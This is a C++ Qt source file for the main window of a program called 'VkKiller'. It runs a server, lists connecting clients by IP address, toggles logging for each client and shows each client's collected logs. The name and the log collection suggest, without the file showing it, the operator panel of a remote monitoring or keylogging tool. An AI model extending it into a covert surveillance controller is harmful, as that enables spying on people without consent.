#include <QMessageBox>

#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "logs_dialog.h"

#include "vkkiller_server.h"
#include "vkkiller_client.h"


MainWindow::MainWindow(QWidget* parent):
    QMainWindow (parent),
    ui          (new Ui::MainWindow),
    m_server    (std::make_unique<VkKillerServer>())
{
    ui->setupUi(this);
    ui->label_serverStatus->setText("Server status: <font color = 'red'><b>disabled</b></font>");

    connect(m_server.get(),  &VkKillerServer::clientConnected,
            this,            &MainWindow::markClientAsOnline);

    connect(m_server.get(),  &VkKillerServer::clientDisconnected,
            this,            &MainWindow::markClientAsOffline);

    connect(ui->clientsList, &QListWidget::doubleClicked,
            this,            &MainWindow::showLogsDialog);

    connect(ui->clientsList, &QListWidget::itemChanged,
            this,            &MainWindow::changeLoggingEnabled);



    m_server->enableLogging(true);
}


MainWindow::~MainWindow() {
    for (auto& client: m_clients)
        client = nullptr;
    m_clients.clear();

    delete ui;
}


void MainWindow::markClientAsOnline(const VkKillerClient* client) {
    auto    row = m_rowsAtClientsList.find(client->id());
    QString str = client->address().toString() + "    (online)";

    if (ui->enableLogging->isChecked())
        m_server->enableLoggingFor(client, true);

    if (row != m_rowsAtClientsList.end()) {
        ui->clientsList->itemAt(row.value(), 0)->setText(str);
        return;
    }

    QListWidgetItem* item = new QListWidgetItem(str, ui->clientsList);
    item->setFlags(item->flags() | Qt::ItemIsUserCheckable);
    item->setCheckState(Qt::Checked);

    ui->clientsList->addItem(item);
    m_clients.push_back(client);
    m_rowsAtClientsList[client->id()] = m_clients.size() - 1;
}


void MainWindow::showLogsDialog(QModelIndex index) {
    const VkKillerClient* client = m_clients[index.row()];
    LogsDialog*   dialog = new LogsDialog(this);

    dialog->setWindowTitle(client->address().toString());
    dialog->loadLogs(client->logs());
    dialog->show();
}


void MainWindow::markClientAsOffline(const VkKillerClient* client) {
    auto    row   = m_rowsAtClientsList.find(client->id());
    QString str  = client->address().toString() + "    (offline)";
    ui->clientsList->itemAt(row.value(), 0)->setText(str);
}


void MainWindow::changeLoggingEnabled(QListWidgetItem* item) {
    int  row  = ui->clientsList->row(item);
    if (row >= m_clients.size()) return;
    m_server->enableLoggingFor(m_clients[row], item->checkState());
}


void MainWindow::on_startServer_clicked() {
    QString address_str = ui->lineEdit_IpAddress->text();
    quint16 port        = ui->spinBox_Port->value();

    QHostAddress address;

    if (address_str == "Any")
        address = QHostAddress::Any;
    else if (address_str == "AnyIPv4")
        address = QHostAddress::AnyIPv4;
    else if (address_str == "AnyIPv6")
        address = QHostAddress::AnyIPv6;
    else if (address_str == "Broadcast")
        address = QHostAddress::Broadcast;
    else if (address_str == "LocalHost")
        address = QHostAddress::LocalHost;
    else if (address_str == "LocalHostIPv6")
        address = QHostAddress::LocalHostIPv6;

    QString errMsg;
    bool success = m_server->start(address, port, &errMsg);

    if (success) {
        ui->label_serverStatus->setText("Server status: <font color = 'green'><b>OK</b></font>");
        ui->startServer->setEnabled(false);
        ui->stopServer->setEnabled(true);
        ui->enableLogging->setEnabled(true);
    }
    else {
        QMessageBox::critical(0, "Server Error",
        "Unable to start the server: " + errMsg);
    }
}


void MainWindow::on_stopServer_clicked() {
    QMessageBox::StandardButton reply;
    reply = QMessageBox::question(this, "VkKiller Warning", "Are you sure?",
            QMessageBox::Yes | QMessageBox::No);

    if (reply == QMessageBox::Yes) {
        m_server->stop();
        ui->label_serverStatus->setText("Server status: <font color = 'red'><b>disabled</b></font>");
        ui->stopServer->setEnabled(false);
        ui->enableLogging->setEnabled(false);
        ui->startServer->setEnabled(true);
    }
}


void MainWindow::on_enableLogging_stateChanged(int arg1) {
    if (arg1) {
        for(int i = 0; i < ui->clientsList->count(); ++i)
            ui->clientsList->item(i)->setCheckState(Qt::Checked);
        m_server->enableLogging(true);
    }
    else {
        for(int i = 0; i < ui->clientsList->count(); ++i)
            ui->clientsList->item(i)->setCheckState(Qt::Unchecked);
        m_server->enableLogging(false);
    }
}


void MainWindow::on_close_clicked() {
    if (!m_server->isListening()) {
        close();
        return;
    }

    QMessageBox::StandardButton reply;
    reply = QMessageBox::question(this, "VkKiller Warning", "Are you sure?",
            QMessageBox::Yes | QMessageBox::No);

    if (reply == QMessageBox::Yes) {
        m_server->stop();
        close();
    }
}
